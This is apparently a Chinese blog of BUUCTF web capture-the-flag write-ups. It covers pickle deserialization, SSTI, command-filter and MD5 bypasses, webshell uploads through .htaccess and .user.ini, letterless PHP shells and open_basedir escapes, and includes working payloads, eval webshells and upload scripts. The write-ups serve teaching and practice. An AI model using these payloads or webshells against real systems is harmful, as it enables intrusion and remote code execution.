然后需要成为大会员，BP抓包发现是利用become传参，在源码的Admin.py中找到了这个参数： def post(self, *args, **kwargs): try: become = self.get_argument('become') p = pickle.loads(urllib.unquote(become)) return self.render('form.html', res=p, member=1) except: return self.render('form.html', res='This is Black Technology!', member=0) 我们看到，这个地方利用了pickle.loads对become传参进行反序列化(关于pickle)，现在就需要构造可读取flag文件的序列化字符串赋给become利用Python反序列化的漏洞拿到flag。 解题从图中看到：我们可以利用reduce，当reduce被定义之后，该对象被Pickle时就会被调用我们这里的eval用于重建对象的时候调用，即告诉python如何pickle他们供eval使用的即打开的文件flag.txt，EXP如下： #python3import picklefrom urllib import parseclass payload(object): def __reduce__(self): return (eval, (\"open('/flag.txt','r').read()\",))a = pickle.dumps(payload())a = parse.quote(a)print (a)#python2import pickleimport urllibclass payload(object): def __reduce__(self): return (eval, (\"open('/flag.txt','r').read()\",))a = pickle.dumps(payload())a = urllib.quote(a)print a 生成payload： c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A. 利用前面伪造的JWT同时将上面的payload传给参数become即可拿到flag。关于Python反序列化漏洞的参考：Pickle反序列化漏洞：https://xz.aliyun.com/t/2289cPickle反序列化漏洞：https://blog.csdn.net/SKI_12/article/details/85015803Python-sec的一些总结：http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/ [ASIS 2019]Unicorn shop考察unicode安全问题，参考如下链接：浅谈Unicode设计的安全性Unicode等价性浅谈UNICODE SECURITY CONSIDERATIONS 解题查看源码发现在charset=UTF-8处提示Ah,really important,seriously.，说明是考察与unicode安全相关的知识，再看题目页面，可以买四种独角兽，但是前三种价格都是一位数，而第四个却是四位数，猜测flag就在第四个。但是输入框只能输入一个字符，参考网上的资料，到前面的网站找一个大于1337的特殊unicode字符，然后将其进行url编码填入输入框拿到flag。可以去这里找。 [WesternCTF 2018]shrine考察SSTI服务端模板注入，参考https://www.cnblogs.com/wangtanzhi/p/12238779.html 题目分析import flaskimport osapp = flask.Flask(__name__)app.config['FLAG'] = os.environ.pop('FLAG')@app.route('/')def index(): return open(__file__).read()@app.route('/shrine/&lt;path:shrine&gt;')def shrine(shrine): def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine))if __name__ == '__main__': app.run(debug=True) 可以看到/shrine/路径下存在对用户输入到模板数据的过滤，(、)被替换为空，config、self都被黑名单过滤掉，但是还是避免不了存在SSTI，先拿一个数学表达式测试一下：2，发现可以执行。接着看代码， app.config['FLAG'] = os.environ.pop('FLAG') 这里注册一个名为FLAG的config，flag应该就在这，这个地方原本可以直接通过读取所有app.config的内容的，但是前面说过config已经被过滤了：下面这行代码就是将config和self替换为空。 return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) 但是这里黑名单过滤的内容比较少，其实还有其他内置函数能实现同样的功能，如url_for和get_flashed_messages关于这两个函数可以参考：https://www.jianshu.com/p/bcf57a3092ce 解题直接上payload了 /shrine/{{url_for.__globals__['current_app'].config}}/shrine/{{get_flashed_messages.__globals__['current_app'].config}} 读取到flag如下：PHP中也有很多模板渲染的漏洞，以后遇到了慢慢学吧。附上一个模板注入点扫描工具tplmap [安洵杯 2019]easy_web考察多次编码，MD5强碰撞 题目分析进入题目之后，看题目的url发现了可疑的参数img和cmd，并且img的值是一串base64，解码之后还是base64，再解码拿到一串hex码，最终解码是555.png，这就说明，读取文件的时候是先进行hex编码，然后两次base64编码传参，那么我们利用这个特点就可以读其他文件了。先看index.php的内容，三次编码传参之后拿到源码： &lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header('content-type:text/html;charset=utf-8');$cmd = $_GET['cmd'];if (!isset($_GET['img']) || !isset($_GET['cmd'])) header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=');$file = hex2bin(base64_decode(base64_decode($_GET['img'])));$file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file);if (preg_match(\"/flag/i\", $file)) { echo '&lt;img src =\"./ctf3.jpeg\"&gt;'; die(\"xixi～ no flag\");} else { $txt = base64_encode(file_get_contents($file)); echo \"&lt;img src='data:image/gif;base64,\" . $txt . \"'&gt;&lt;/img&gt;\"; echo \"&lt;br&gt;\";}echo $cmd;echo \"&lt;br&gt;\";if (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|&lt;|&gt;/i\", $cmd)) { echo(\"forbid ~\"); echo \"&lt;br&gt;\";} else { if ((string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])) { echo `$cmd`; } else { echo (\"md5 is funny ~\"); }}?&gt;&lt;html&gt;&lt;style&gt; body{ background:url(./bj.png) no-repeat center center; background-size:cover; background-attachment:fixed; background-color:#CCCCCC;}&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 可以看到preg_match(&quot;/flag/i&quot;, $file)说明flag在/flag中，同时 preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|&lt;|&gt;/i\", $cmd) 对cmd传参内容进行了很多的过滤，可以看到cat被ban了，但是对\\用了\\\\来过滤，之前打比赛遇到过，这样匹配其实匹配不到\\，因此可以借助ca\\t来绕过，这里其实还可以用sort命令来读取flag的。 sort：sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。 其实Linux中对命令过滤的绕过方式还很多，参考这里 另一个考点是MD5强比较绕过： if ((string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])) { echo `$cmd`;} 这里是固定用法： a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 其实原理是生成两个txt文件，文件内容只有几位不同，但最后的md5值是相同的。 解题利用cmd传参sort%20/flag或ca\\t%20/flag即可，当然c\\at效果一样，这与linux的命令相关，最后拿到flag。巨坑！如果想要用BP抓包改POST的内容，web端一定是要POST传数据，不能GET传参之后抓包再改成POST，否则失败！ [极客大挑战 2019]Upload常规文件上传题，对后缀名进行了过滤，一般用php、php3、php4、php5、phtml、pht来绕过，本题是利用pht绕过的。本题也对&lt;?进行了过滤，利用GIF89a &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;即可。 解题上传构造好的小马，抓包之后把文件类型改为image/jpg上传之后即可成功解析小马存在了/upload路径下，蚁剑连接拿flag。 [CISCN 2019]Love Math主要考察PHP基本函数的利用，还有变量与函数关联的知识 补充知识一些基本的函数： scandir()函数：返回指定目录中的文件和目录的数组。base_convert()函数：在任意进制之间转换数字。dechex()函数：把十进制转换为十六进制。hex2bin()函数：把十六进制值的字符串转换为 ASCII 字符。var_dump()函数:用于输出变量的相关信息。readfile()函数：输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回false。您可以通过@readfile()形式调用该函数，来隐藏错误信息。 动态函数 php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数例如：$function = &quot;sayHello&quot;;$function(); php中函数名默认为字符串 例如本题白名单中的asinh和pi可以直接异或，这就增加了构造字符的选择. 题目分析打开连接，给出了源码： &lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET['c'])){ show_source(__FILE__);}else{ //例子 c=20-1 $content = $_GET['c']; if (strlen($content) &gt;= 80) { die(\"太长了不会算\"); } $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(\"请不要输入奇奇怪怪的字符\"); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\"请不要输入奇奇怪怪的函数\"); } } //帮你算出答案 eval('echo '.$content.';');} 分析源码可知，对参数内容作了以下的限制： 1、长度不能超过80； 2、不能包含,\\t,\\r,\\n,',&quot;,反引号,[,`]`` 这些字符； 3、不能有不是$whitelist白名单里面的字符串出现； 单单传参c肯定是不行了，有两种思路来拿flag：加一个参数：我们需要构造个$_GET[1]，然后再拿flag，但是[、]都不能用，因此不能直接构造，这个时候我们就可以利用白名单中的那些函数来构造。直接cat flag：也需要用到上面说的一些函数来构造。主要用到base_convert、dechex两个函数，同时将pi、abs当做参数来利用。 解题加参数构造&amp;_GET传参：payload 1： $pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat /flagbase_convert(37907361743,10,36) =&gt; \"hex2bin\"dechex(1598506324) =&gt; \"5f474554\"$pi=hex2bin(\"5f474554\") =&gt; $pi=\"_GET\" //hex2bin将一串16进制数转换为二进制字符串($$pi){pi}(($$pi){abs}) =&gt; ($_GET){pi}($_GET){abs} //{}可以代替[] 但是这种方法会报400 Bad Request，可能跟构造的&amp;_GET相关，网上参考到不能&amp;_GET传参，可以用header来传，可以构造如下：payload 2 $pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})base_convert(696468,10,36) =&gt; \"exec\"$pi(8768397090111664438,10,30) =&gt; \"getallheaders\"exec(getallheaders(){1})//操作xx和yy，中间用逗号隔开，echo都能输出echo xx,yy 这里用到了apache下的getallheaders这个函数：我们结合这个payload，抓包之后在其中添上1: cat /flag(这里需要注意一下，BUU的flag都在根目录下，直接cat /flag即可，网上一些参考题解是cat flag.php是读不到的)，拿到flag： 直接构造拿cat /flag//exec('hex2bin(dechex(109270211257898))') =&gt; exec('cat f*')($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))//system('cat'.dechex(16)^asinh^pi) =&gt; system('cat *')base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))这两条是参考网上的题解，没有做出更改，用的话稍微改一下即可 [GXYCTF2019]禁止套娃考察无参数RCE，参考这篇文章 题目分析进入题目只有一句flag在哪？其实有点无从下手，参考网上的题解提示是git泄露，但是用githack没跑出来，最后还是用gitextract跑出来了源码：(githack得更新了…) &lt;?phpinclude \"flag.php\";echo \"flag在哪里呢？&lt;br&gt;\";if(isset($_GET['exp'])){ if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) { if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) { if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) { // echo $_GET['exp']; @eval($_GET['exp']); } else{ die(\"还差一点哦！\"); } } else{ die(\"再好好想想！\"); } } else{ die(\"还想读flag，臭弟弟！\"); }}// highlight_file(__FILE__);?&gt; 我们需要用exp传参，但是参数会经过三层正则匹配的过滤：第一层： preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp']) 这一层过滤了常用的PHP伪协议第二层： if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) 这一层的匹配明显提示我们是无参数RCE，其中的?R是递归地进行匹配第三次： if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) 过滤掉常见的关键字。直接getflag不现实了，那就想办法利用函数来获取。 解题首先需要获取当前目录下的文件，可以实现的函数有scandir(.)(.表示当前目录)，但是.又不能用，此时想到localeconv()：函数返回一包含本地数字及货币格式信息的数组。数组的第一项就是.这时再借助current()/pos()返回数组中的当前单元, 默认取第一个值。也就是说current(localeconv())就是.了。payload如下： /?exp=print_r(scandir(current(localeconv())));/?exp=print_r(scandir(pos(localeconv()))); 可以看到flag.php在第四个数组元素中，读取它的源码就能拿到flag。如何读取倒数第二个数组元素呢？ 这里有三种方法：1、array_reverse()以相反的顺序返回数组元素，再结合函数next()即可。这里构造payload： /?exp=print_r(next(array_reverse(scandir(current(localeconv()))))); 效果如下：2、array_rand()和array_flip()array_flip()交换数组的键和值；array_rand()从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回，本题目中scandir()返回的数组只有5个元素，刷新几次就能刷出来flag.php。构造payload： /?exp=print_r(array_rand(array_flip(scandir(current(localeconv()))))); 效果如下：3、session_id(session_start())session_start()启动新会话或者重用现有会话；session_id()获取到当前的session id;本题目虽然ban了hex关键字，导致hex2bin()被禁用，但是我们可以并不依赖于十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身就支持的。这里使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。然后利用session_id()获取到当前的session id。我们再在header中设置PHPSESSID的cookie，值就为flag.php，效果如下： 最后如何获取源码呢？因为et被ban，所以可以用readfile()或highlight_file()以及其别名函数show_source()，结合几种方法，最终构造下列payload： /?exp=readfile(next(array_reverse(scandir(current(localeconv())))));/?exp=show_source(next(array_reverse(scandir(current(localeconv())))));/?exp=show_source(session_id(session_start())); //配合BP使用... 自己组合吧 拿到flag： [SUCTF 2019]EasyWeb考察的知识有点杂，主要涉及构造不包含数字和字母的webshell、文件上传绕过、绕过open_basedir/disable_function知识量有点大，好好记录一下。 知识拓展构造不包含数字和字母的webshell首先，明确思路。我的核心思路是，将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，如assert，然后动态执行之即可。那么，变换方法 将是解决本题的要点。 不过在此之前，我需要说说php5和7的差异。 php5中assert是一个函数，我们可以通过$f='assert';$f(...);这样的方法来动态执行任意代码。 但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。以上参考P神的博客。这里介绍三种构造shell的方法：1、利用异或在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。在PHP中，两个变量进行异或时，先会将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或之后，又将结果从二进制转换成了ASCII值，再将ASCII值转换成字符串。异或操作有时也被用来交换两个变量的值。这里附上一个网上看到的代码： &lt;?php$l = \"\";$r = \"\";$argv = str_split(\"_GET\");for($i=0;$i&lt;count($argv);$i++){ for($j=0;$j&lt;255;$j++) { $k = chr($j)^chr(255); \\\\dechex(255) = ff if($k == $argv[$i]){ if($j&lt;16){ $l .= \"%ff\"; $r .= \"%0\" . dechex($j); continue; } $l .= \"%ff\"; $r .= \"%\" . dechex($j); continue; } }}echo \"\\{$l`$r\\}\";?&gt; 然后配合下面的payload，可以执行一些函数。 ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;ff=phpinfo 抛开这道题，还可以类似这样地使用： http://127.0.0.1/?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}(\"type index.php\");&amp;%ff=system。 最后的exp: $a = (%9e ^ %ff).(%8c ^ %ff).(%8c ^ %ff).(%9a ^ %ff).(%8d ^ %ff).(%8b ^ %ff);\\\\assert$b = \"_\" . (%af ^ %ff).(%b0 ^ %ff).(%ac ^ %ff).(%ab ^ %ff);$c = $$b;\\\\$b = $_POST$a($c[777]); 2、取反构造与方法1有异曲同工之妙，唯一差异就是，方法1使用的是位运算里的异或，本方法使用的是位运算里的取反。本方法利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如'和'{2}的结果是\\x8c，其取反即为字母s，还有一些其他的如下图：图片来源于P神的那篇文章。当然，在这道题里已经过滤了数字，那怎么来构造{}中的数字呢？这个可以利用PHP的弱类型特性：true的值为1，故true+true==2，也就是('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;')==2。然后便可以一步一步构造即可。后面有一篇博客里[SUCTF 2018]GetShell这道题用到了这个知识点。3、自增构造参考http://php.net/manual/zh/language.operators.increment.php可以了解到'a'++ =&gt; 'b'，'b'++ =&gt; 'c'… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。那如何获取a呢？数组Array的第一个字母就是大写A，而且第4个字母是小写a。利用它可以同时拿到a和A，等于我们就可以拿到a-z和A-Z的所有字母了。在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array，然后再取这个字符串的第一个字符就是A了，同理获取a。还可以利用下面的方式来获取： &lt;?php function B(){ echo \"HI!\"; } $_++; $__= \"?\" ^ \"}\"; $__();? 1、$_++;这行代码的意思是对变量名为_的变量进行自增操作，在PHP中未定义的变量默认值为null，null==false==0，我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字；2、$__=&quot;?&quot; ^ &quot;}&quot;;对字符?和}进行异或运算，得到结果B赋给变量名为__的变量；3、$__();通过上面的赋值操作，变量$__的值为B，所以这行可以看作是B(),在PHP中,这行代码表示调用函数B,所以执行结果为HI!,在PHP中，我们可以将字符串当作函数来处理。 想要更深的了解，参考前面的链接。 文件上传绕过关于解析之前讲过一个借用.user.ini解析来上传小马的，这里再扩展一下： nginx的服务器，而且上传目录下有一个php文件，所以上传.user.iniapache的服务器，应该上传.htaccess .user.ini的已经讲过了，这里讲一下.htaccess：上传的时候不能用GIF89a等文件头去绕过exif_imagetype,因为这样虽然能上传成功，但.htaccess文件无法生效。这时有两个办法: #define width 1337#define height 1337 #在.htaccess是注释符，所以.htaccess文件可以生效。同时在.htaccess前添加x00x00x8ax39x8ax39(要在十六进制编辑器中添加，或者使用python的bytes类型)，这里x00x00x8ax39x8ax39是wbmp文件的文件头，.htaccess中以0x00开头的同样也是注释符，所以不会影响.htaccess。对&lt;?过滤的绕过对&lt;?绕过的一般可以借用&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;来绕过，但是当PHP的版本是7以上的时候，本方法不可用了，此时需要用另一种方法：可以通过编码进行绕过，如原来使用utf-8编码，如果shell中是用utf-16编码则可以Bypass。在本题中的用法后面再讲。 绕过open_basedir/disable_functionopen_basedir是php.ini中的一个配置选项，它可将用户访问文件的活动范围限制在指定的区域。假设open_basedir=/home/wwwroot/home/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/home/wwwroot/home/web1/和/tmp/这两个目录以外的文件。注意用open_basedir指定的限制实际上是前缀，而不是目录名。举例来说: 若open_basedir = /dir/user, 那么目录/dir/user和/dir/user1都是可以访问的，所以如果要将访问限制在仅为指定的目录，注意用斜线结束路径名。更多的可以参考这里。 解题进入题目看到源码： &lt;?phpfunction get_the_flag(){ // webadmin will remove your upload file every 20 min!!!! $userdir = \"upload/tmp_\".md5($_SERVER['REMOTE_ADDR']); if(!file_exists($userdir)){ mkdir($userdir); } if(!empty($_FILES[\"file\"])){ $tmp_name = $_FILES[\"file\"][\"tmp_name\"]; $name = $_FILES[\"file\"][\"name\"]; $extension = substr($name, strrpos($name,\".\")+1); if(preg_match(\"/ph/i\",$extension)) die(\"^_^\"); if(mb_strpos(file_get_contents($tmp_name), '&lt;?')!==False) die(\"^_^\"); if(!exif_imagetype($tmp_name)) die(\"^_^\"); $path= $userdir.\"/\".$name; @move_uploaded_file($tmp_name, $path); print_r($path); }}$hhh = @$_GET['_'];if (!$hhh){ highlight_file(__FILE__);}if(strlen($hhh)&gt;18){ die('One inch long, one inch strong!');}if ( preg_match('/[\\x00- 0-9A-Za-z\\'\"\\`~_&amp;.,|=[\\x7F]+/i', $hhh) ) die('Try something else!');$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(\"Almost there!\");eval($hhh);?&gt; 可以看到，代码主要分为两部分：get_the_flag()和各种过滤的代码(主要是为了调用get_the_flag())。可以利用下面的代码fuzz一下： for ($i = 0; $i &lt; 256; $i++) { if (!preg_match('/[x00- 0-9A-Za-z'\"`~_&amp;.,|=[x7F]+/i', chr($i))) { echo urlencode(chr($i)).' '; }}?&gt; 获取到没有被ban的字符： ! # $ % ( ) * + - / : ; &lt; &gt; ? @ ] ^ { } 参考前面讲的拿webshell的三种方法，这里取反符号~直接被禁掉了，自增需要用到变量长度会很长,因此尝试使用异或，因为有长度的限制，所以可以去凑出类似$_GET{x}();然后传入x=get_the_flag调用函数。利用下面的脚本来构造： import urllib.parsefind = ['G','E','T','_']for i in range(1,256): for j in range(1,256): result = chr(i^j) if(result in find): a = i.to_bytes(1,byteorder='big') b = j.to_bytes(1,byteorder='big') a = urllib.parse.quote(a) b = urllib.parse.quote(b) print(\"%s:%s^%s\"%(result,a,b)) 拿到payload： ?_=${%fe%fe%fe%fe^%a1%b9%bb%aa}{%fe}();&amp;%fe=get_the_flag 再看get_the_flag的代码，发现是一个上传，从代码可以看出，对ph、&lt;?、文件的类型都做了判断。那只能上传图片马了，但是还需要上传解析图片马的文件，该题的环境是apache，因此需要上传.htaccess，构造的方法前面也讲过了。现在讲一下.htaccess构造的内容，这里将一句话进行base64编码，然后在.htaccess中利用php伪协议进行解码，内容如下： #define width 1337#define height 1337 AddType application/x-httpd-php .jpgphp_value auto_append_file \"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.jpg\" shell.jpg内容： GIF89a12PD9waHAgZXZhbCgkX0dFVFsnYyddKTs/Pg== 参考大佬的一个完整的上传脚本： import requestsimport base64htaccess = b\"\"\"#define width 1337#define height 1337 AddType application/x-httpd-php .jpgphp_value auto_append_file \"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.jpg\"\"\"\"shell = b\"GIF89a12\" + base64.b64encode(b\"&lt;?php eval($_REQUEST['a']);?&gt;\")url = \"http://300a73e6-9981-40dd-b39a-cdf1584e3ba2.node3.buuoj.cn/?_=${%fe%fe%fe%fe^%a1%b9%bb%aa}{%fe}();&amp;%fe=get_the_flag\"files = {'file':('.htaccess',htaccess,'image/jpeg')}data = {\"upload\":\"Submit\"}response = requests.post(url=url, data=data, files=files)print(response.text)files = {'file':('shell.abc',shell,'image/jpeg')}response = requests.post(url=url, data=data, files=files)print(response.text) 然后访问?a=phpinfo();发现存在open_basedir和disable_functions的限制，参考前面讲到的知识，构造最终payload： ?a=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir('/')); 找到flag文件THis_Is_tHe_F14g，然后构造payload拿flag： ?a=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(file_get_contents('/THis_Is_tHe_F14g')); 偶然发现，其实这个题不去绕过open_basedir和disable_functions的限制，直接访问phpinfo()就有flag…","link":"/2020/02/10/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A1/"},{"title":"BUUCTF-web刷题Ⅰ","text":"在家圈着，有时间可以好好刷刷题了，看glzjin处处打广告，早就想把BUU的题好好刷刷了，从现在开始吧！ [强网杯 2019]高明的黑客题目分析进入链接之后是下图的页面：提示我们源码在www.tar.gz中，那么我们把源码下载下来进行审计。发现是这个压缩包包含了几千个php文件，并且每个文件里代码都不少，参数也都是乱序字母，像是经过加密的一样…但是，经过审计代码，我们发现，很多文件中都包含了不少的GET和POST方式进行传参的代码，并且还有很多调用eval的地方，这不就是后门嘛，但是经过测试，在eval调用的参数中传入命令没有效果…这么多文件，每个文件又是这么多参数和eval的调用，猜测是在某个文件中包含可以成功拿到shell的参数和eval调用，这么多文件，只好写脚本进行测试，来找到存在后门的文件了。 解题脚本这里参考一个工作效率比较高的脚本： import osimport requestsimport reimport threadingimport timeprint('开始时间： '+ time.asctime(time.localtime(time.time())))s1 = threading.Semaphore(100) #信号量，设置最大的线程数filePath = r\"F:/phpStudy_64/phpstudy_pro/WWW/src/\"os.chdir(filePath) #改变当前的路径requests.adapters.DEFAULT_RETRIES = 5 #设置重连次数，防止线程数过高，断开连接files = os.listdir(filePath)session = requests.Session()session.keep_alive = False # 设置连接活跃状态为Falsedef get_content(file): s1.acquire() #每当调用acquire()时内置计数器-1 print('trying '+file+' '+time.asctime(time.localtime(time.time()))) with open(file,encoding='utf-8') as f: #打开php文件，提取所有的$_GET和$_POST的参数 gets = list(re.findall('\\$_GET\\[\\'(.*?)\\'\\]', f.read())) posts = list(re.findall('\\$_POST\\[\\'(.*?)\\'\\]', f.read())) data = {} #所有的$_POST params = {} #所有的$_GET for m in gets: params[m] = \"echo 'xxxxxx';\" for n in posts: data[n] = \"echo 'xxxxxx';\" url = 'http://127.0.0.1/src/'+file req = session.post(url, data=data, params=params) #一次性请求所有的GET和POST req.close() # 关闭请求,释放内存 req.encoding = 'utf-8' content = req.text #print(content) if \"xxxxxx\" in content: #如果发现有可以利用的参数，继续筛选出具体的参数 flag = 0 for a in gets: req = session.get(url+'?%s='%a+\"echo 'xxxxxx';\") content = req.text req.close() # 关闭请求,释放内存 if \"xxxxxx\" in content: flag = 1 break if flag != 1: for b in posts: req = session.post(url, data={b:\"echo 'xxxxxx';\"}) content = req.text req.close() # 关闭请求 释放内存 if \"xxxxxx\" in content: break if flag == 1: #flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0， param = a else: param = b print('找到了利用文件： '+file+\" and 找到了利用的参数：%s\" %param) print('结束时间： ' + time.asctime(time.localtime(time.time()))) s1.release()for i in files: #加入多线程 t = threading.Thread(target=get_content, args=(i,)) t.start() 这个脚本会输出存在后门的文件名和可以拿到shell的参数，我们拿到参数之后，再传参，url参数内容为cat /flag即可拿到flag。 [SUCTF 2019]CheckIn题目分析打开链接，是一个文件上传页面，第一反应上传图片马结果显示&lt;? in contents!这提示我们上传的图片马中不能包含&lt;?，同时也得知是黑名单过滤了，那么可以利用&lt;script language='php'&gt;&lt;scirpt&gt;类型的图片马来绕过过滤，和NCTF中的一道题是一样的知识点。我们构造这种图片马上传，回显如下：提示exif_imagetype:not image!，猜测后端应该调用了php的exif_imagetype()函数，这个在图片马中添加图片文件头就可以绕过，这里添加GIF89a来绕过，上传之后回显如下：我们看到，文件成功上传，但是现在用蚁剑链接的话，还是失败，因为传上去的带图片文件头的图片马并没有被解析，因此需要上传.htaccess文件或者.user.ini文件来解析图片马。这里服务器版本比较高不能用.htaccess来解析，那么便需要用.user.ini来解析我们上传的图片马。 .user.ini这是一个与php配置相关的文件，可以在php手册查看对其的描述：从官方描述中我们看到.user.ini可以支持用户配置php.ini中的PHP_INI_PERDIR和PHP_INI_USER，只要是在CGI/FastCGI模式的服务器上都支持.user.ini。同时我们在官方手册关于php.ini配置选项列表的描述中看到auto_append_file和auto_prepend_file都适用在PHP_INI_PERDIR中，即可以通过.user.ini来配置它们。我们需要知道这两个配置的作用： 1、auto_append_file：指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。 2、auto_prepend_file：指定一个文件，自动包含在要执行的文件后，但是如果在包含之前遇到exit()函数便不会包含。 它们的使用方法是直接写在.user.ini中即可，如： auto_append_file=01.gifauto_prepend_file=01.gif 至此，我们的解题思路就很明确了： 1、构造包含GIF89a的图片马 2、图片马用&lt;script language='php'&gt;&lt;scirpt&gt;类型的代码 3、构造.user.ini文件，其中包含我们要上传的图片马名称 4、先传入.user.ini然后上传图片马 5、蚁剑连接，拿flag 解题构造图片马： GIF89a&lt;script language=\"php\"&gt;eval($_POST['x']);&lt;/script&gt; 构造.user.ini文件 GIF89aauto_prepend_file=xxx.jpg //注意：该处的名称要与图片马的名称相同 